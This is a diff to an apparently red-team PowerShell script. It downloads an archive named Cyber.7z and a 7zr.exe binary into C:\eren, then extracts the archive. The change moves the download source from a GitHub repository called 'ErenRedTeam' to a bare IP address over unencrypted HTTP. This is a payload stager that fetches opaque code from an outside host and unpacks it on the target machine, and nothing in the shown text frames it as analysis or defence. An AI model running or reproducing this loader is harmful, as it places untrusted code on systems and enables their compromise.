@@ -28,8 +28,8 @@ if (-not (Test-Path "C:\eren")) {
 }
 
 
-Start-BitsTransfer -Source "https://github.com/dheenaxe/ErenRedTeam/raw/refs/heads/main/Cyber.7z" -Destination "C:\eren\Cyber.7z"
-Start-BitsTransfer -Source "https://github.com/dheenaxe/ErenRedTeam/raw/refs/heads/main/7zr.exe" -Destination "C:\eren\7zr.exe"
+Start-BitsTransfer -Source "http://78.129.240.79:8080/Cyber.7z" -Destination "C:\eren\Cyber.7z"
+Start-BitsTransfer -Source "http://78.129.240.79:8080/7zr.exe" -Destination "C:\eren\7zr.exe"
 
 
 Start-Process "C:\eren\7zr.exe" -ArgumentList "x", "C:\eren\Cyber.7z", "-oC:\eren\", "-y" -Wait
